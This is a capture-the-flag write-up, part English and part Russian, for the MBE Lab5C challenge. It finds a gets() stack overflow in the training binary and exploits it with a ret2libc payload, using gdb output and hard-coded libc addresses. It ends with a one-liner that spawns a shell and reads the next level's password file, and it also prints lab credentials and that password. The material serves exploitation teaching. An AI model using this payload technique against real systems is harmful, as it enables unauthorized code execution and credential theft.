---
title: "Разбор Lab5C (легко)"
permalink: /writeups/mbe/lab5c/
excerpt: "Разбор Lab5C."
---

---
First, log into the Lab05 as **lab5C** (`lab5C:lab05start`) and go to the challenges folder:

```shell
$ ssh lab5C@<VM_IP>
$ cd /levels/lab05/
```

Let's try to execute the program:

```bash
lab5C@warzone:/levels/lab05$ ./lab5C
I included libc for you...
Can you ROP to system()?
Maybe...
```

Okay, we probably need to provide a ROP-chain here. But before that, note that from the beginning of the challenge, the binaries were compiled with `-z execstack` which marks the stack as **executable**, but it's no longer the case as we can see by running `checksec` on our executable.

```bash
$ checksec ./lab5C
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY FORTIFIED FORTIFY-able  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No  0   2./lab5C
```

See the **NX enabled** flag? Data Execution Prevention (or DEP) is enabled, it's gonna be a bit more difficult to execute our own code on the stack. DEP is an exploit mitigation technique used to ensure that only code segments are ever marked as executable and mitigate code injection / shellcode payloads.

If we try to execute code injected on the stack, the binary will **segfault**. Lucky for us, some segments in the binary are still executable, like *.text*.

```bash
lab5C@warzone:/levels/lab05$ readelf -S ./lab5C
There are 30 section headers, starting at offset 0x1150:

Section Headers:

...[snip]...

  [11] .init             PROGBITS        080484f8 0004f8 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048520 000520 000050 04  AX  0   0 16
  [13] .text             PROGBITS        08048570 000570 000202 00  AX  0   0 16
  [14] .fini             PROGBITS        08048774 000774 000014 00  AX  0   0  4
  [15] .rodata           PROGBITS        08048788 000788 00003c 00   A  0   0  4
  [16] .eh_frame_hdr     PROGBITS        080487c4 0007c4 000034 00   A  0   0  4

...[snip]...

Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
```

So, if you can’t inject code, you must re-use the existing code! This technique is called ROP or Return Oriented Programming. It aims to reuse existing code, also called gadgets, in a target binary as a method to bypass DEP. 

A gadget is a sequence of meaningful instructions typically followed by a **return** (or `ret`) instruction. Usually multiple gadgets are chained together to compute malicious actions like a shellcode does. These chains are called ROP Chains. Here are some examples of gadgets:

```nasm
; Gadget 1
xor   eax, eax
ret
; Gadget 2
pop   ebx
pop   eax
ret
; Gadget 3
add eax,ebx 
ret
```

There are many tools to find gadgets in an executable like `ropgadget`:

```bash
$ ropgadget ./lab5C
Gadgets information
============================================================
0x080488b3 : adc al, 0x41 ; ret
0x0804860b : add al, -0x39 ; add al, 0x24 ; and al, 0xffffffa0 ; add al, 8 ; call edx
0x080485d0 : add al, 0x24 ; and al, 0xffffffa0 ; add al, 8 ; call eax
0x0804860d : add al, 0x24 ; and al, 0xffffffa0 ; add al, 8 ; call edx
0x0804887d : add al, 0x6e ; ret
0x08048638 : add al, 8 ; add ecx, ecx ; ret

...[snip]...
```

We won't go further in the explanation as the course gives you some hints about it. Let's check the code.

## Анализ исходного кода

The code is fairly simple:

```c
#include <stdlib.h>
#include <stdio.h>

/* gcc -fno-stack-protector -o lab5C lab5C.c */

char global_str[128];

/* reads a string, copies it to a global */
void copytoglobal()
{
    char buffer[128] = {0};
    gets(buffer);
    memcpy(global_str, buffer, 128);
}

int main()
{
    char buffer[128] = {0};

    printf("I included libc for you...\n"\
           "Can you ROP to system()?\n");

    copytoglobal();

    return EXIT_SUCCESS;
}
```

We can already see that there will be an overflow if we send too much data. Now, we just need to build find how many bytes are necessry to overwrite **EIP** and build a ROP chain.

## Динамический анализ

Here, we'll create a pattern and send it as input to the binary.

```nasm
$ gdb -q ./lab5C
Reading symbols from ./lab5C...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwA'
gdb-peda$ r < <(python -c "print('AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwA')")
Starting program: /levels/lab05/lab5C < <(python -c "print('AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwA')")
I included libc for you...
Can you ROP to system()?

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x20 (' ')
EBX: 0x41415341 ('ASAA')
ECX: 0x0
EDX: 0x804a060 ("AAA%AAsAABAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlA")
ESI: 0x5441416f ('oAAT')
EDI: 0x41704141 ('AApA')
EBP: 0x41415541 ('AUAA')
ESP: 0xbffff620 ("AArAAWAAsAAXAAtAAYAAuAAZAAvAAwA")
EIP: 0x56414171 ('qAAV')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x56414171
[------------------------------------stack-------------------------------------]
0000| 0xbffff620 ("AArAAWAAsAAXAAtAAYAAuAAZAAvAAwA")
0004| 0xbffff624 ("AWAAsAAXAAtAAYAAuAAZAAvAAwA")
0008| 0xbffff628 ("sAAXAAtAAYAAuAAZAAvAAwA")
0012| 0xbffff62c ("AAtAAYAAuAAZAAvAAwA")
0016| 0xbffff630 ("AYAAuAAZAAvAAwA")
0020| 0xbffff634 ("uAAZAAvAAwA")
0024| 0xbffff638 ("AAvAAwA")
0028| 0xbffff63c --> 0x417741 ('AwA')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x56414171 in ?? ()
```

It **segfault**, good. Now we can look for the pattern in memory.

```nasm
gdb-peda$ pattern_search
Registers contain pattern buffer:
EIP+0 found at offset: 165
EBX+0 found at offset: 149
EDI+0 found at offset: 157
EBP+0 found at offset: 161
ESI+0 found at offset: 153

...[snip]...
```

**EIP** seems to be at offset **165**, let's build the first proof of concept.

```nasm
gdb-peda$ r < <(python -c "print('A' * 165 + 'BBBB' + 31 * 'C')")
Starting program: /levels/lab05/lab5C < <(python -c "print('A' * 165 + 'BBBB' + 31 * 'C')")
I included libc for you...
Can you ROP to system()?

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x20 (' ')
EBX: 0x41414141 ('AAAA')
ECX: 0x0
EDX: 0x804a060 ('A' <repeats 128 times>)
ESI: 0x41414141 ('AAAA')
EDI: 0x41414141 ('AAAA')
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff620 ("AAAAABBBB", 'C' <repeats 31 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff620 ("AAAAABBBB", 'C' <repeats 31 times>)
0004| 0xbffff624 ("ABBBB", 'C' <repeats 31 times>)
0008| 0xbffff628 ("B", 'C' <repeats 31 times>)
0012| 0xbffff62c ('C' <repeats 28 times>)
0016| 0xbffff630 ('C' <repeats 24 times>)
0020| 0xbffff634 ('C' <repeats 20 times>)
0024| 0xbffff638 ('C' <repeats 16 times>)
0028| 0xbffff63c ('C' <repeats 12 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

Hum, it seems that we are a bit off. Let's check the stack and try to fix that.

```nasm
gdb-peda$ x/32wx $esp
0xbffff620: 0x41414141  0x42424241  0x43434342  0x43434343
0xbffff630: 0x43434343  0x43434343  0x43434343  0x43434343
0xbffff640: 0x43434343  0x43434343  0x00000000  0x00000000
0xbffff650: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff660: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff670: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff680: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff690: 0x00000000  0x00000000  0x00000000  0x00000000
```

Ok, we are **9** bytes off, the **5** bytes on the stack + the **4** bytes stored in the **EIP**.

```nasm
gdb-peda$ r < <(python -c "print('A' * 156 + 'BBBB' + 31 * 'C')")
Starting program: /levels/lab05/lab5C < <(python -c "print('A' * 156 + 'BBBB' + 31 * 'C')")
I included libc for you...
Can you ROP to system()?

Program received signal SIGSEGV, Segmentation fault.

...[snip]...

Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```
Better! As stated in the code, the **libc** is included and could be used to do a *ret2libc* exploit. We just need some information like a pointer to "/bin/sh" and *system()*.

```nasm
gdb-peda$ searchmem "/bin/sh" libc
Searching for '/bin/sh' in: libc ranges
Found 1 results, display max 1 items:
libc : 0xb7f83a24 ("/bin/sh")
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
```

Now, before running the PoC, let's put a breakpoint at the return address of *copytoglobal()* to check the content of the stack before executing the payload.


```nasm
gdb-peda$ break *copytoglobal+82
Breakpoint 1 at 0x80486bf
gdb-peda$ r < <(python -c "print('A' * 156 + '\x90\x31\xe6\xb7' + 'JUNK' + '\x24\x3a\xf8\xb7' + 31 * 'C')")
Starting program: /levels/lab05/lab5C < <(python -c "print('A' * 156 + '\x90\x31\xe6\xb7' + 'JUNK' + '\x24\x3a\xf8\xb7' + 31 * 'C')")
I included libc for you...
Can you ROP to system()?
[----------------------------------registers-----------------------------------]
EAX: 0x20 (' ')
EBX: 0x41414141 ('AAAA')
ECX: 0x0
EDX: 0x804a060 ('A' <repeats 128 times>)
ESI: 0x41414141 ('AAAA')
EDI: 0x41414141 ('AAAA')
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff61c --> 0xb7e63190 (<__libc_system>:    push   ebx)
EIP: 0x80486bf (<copytoglobal+82>:  ret)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80486bc <copytoglobal+79>: pop    esi
   0x80486bd <copytoglobal+80>: pop    edi
   0x80486be <copytoglobal+81>: pop    ebp
=> 0x80486bf <copytoglobal+82>: ret
   0x80486c0 <main>:    push   ebp
   0x80486c1 <main+1>:  mov    ebp,esp
   0x80486c3 <main+3>:  push   edi
   0x80486c4 <main+4>:  push   ebx
[------------------------------------stack-------------------------------------]
0000| 0xbffff61c --> 0xb7e63190 (<__libc_system>:   push   ebx)
0004| 0xbffff620 ("JUNK$:\370\267", 'C' <repeats 31 times>)
0008| 0xbffff624 --> 0xb7f83a24 ("/bin/sh")
0012| 0xbffff628 ('C' <repeats 31 times>)
0016| 0xbffff62c ('C' <repeats 27 times>)
0020| 0xbffff630 ('C' <repeats 23 times>)
0024| 0xbffff634 ('C' <repeats 19 times>)
0028| 0xbffff638 ('C' <repeats 15 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080486bf in copytoglobal ()
gdb-peda$ x/16wx $esp
0xbffff61c: 0xb7e63190  0x4b4e554a  0xb7f83a24  0x43434343
0xbffff62c: 0x43434343  0x43434343  0x43434343  0x43434343
0xbffff63c: 0x43434343  0x43434343  0x00434343  0x00000000
0xbffff64c: 0x00000000  0x00000000  0x00000000  0x00000000
```

We can see that the pointer to *system()* (`0xb7e63190`) will be the first to be executed, then we have our usual "JUNK" string (`0x4b4e554a`) and, finally, the pointer to our "/bin/sh" string (`0xb7f83a24`). Normally, if we continue with the execution, we should get a shell.

```nasm
gdb-peda$ conti
Continuing.
[New process 4496]
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.19.so...done.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.
process 4496 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.
Error in re-setting breakpoint 1: No symbol "copytoglobal" in current context.
Error in re-setting breakpoint 1: No symbol "copytoglobal" in current context.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.19.so...done.
Error in re-setting breakpoint 1: No symbol "copytoglobal" in current context.
[New process 4497]
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.19.so...done.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.
Error in re-setting breakpoint 1: No symbol "copytoglobal" in current context.
Error in re-setting breakpoint 1: No symbol "copytoglobal" in current context.
process 4497 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.
Error in re-setting breakpoint 1: No symbol "copytoglobal" in current context.
Error in re-setting breakpoint 1: No symbol "copytoglobal" in current context.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.19.so...done.
Error in re-setting breakpoint 1: No symbol "copytoglobal" in current context.
[Inferior 3 (process 4497) exited normally]
Warning: not running or target is remote
```

Great! Let's write our exploit outside `gdb`! 

## Решение

The main advantage of this technique is we won't need to play with the offset of the return address. The exploit should work right away.

```bash
lab5C@warzone:/levels/lab05$ (python -c "print(156 * 'A' + '\x90\x31\xe6\xb7' + 'JUNK' + '\x24\x3a\xf8\xb7')"; cat -) | ./lab5C
I included libc for you...
Can you ROP to system()?
whoami
lab5B
cat /home/lab5B/.pass
s0m3tim3s_r3t2libC_1s_3n0ugh
```

Easy, right? You can go to the next [challenge](/writeups/mbe/lab5b/).
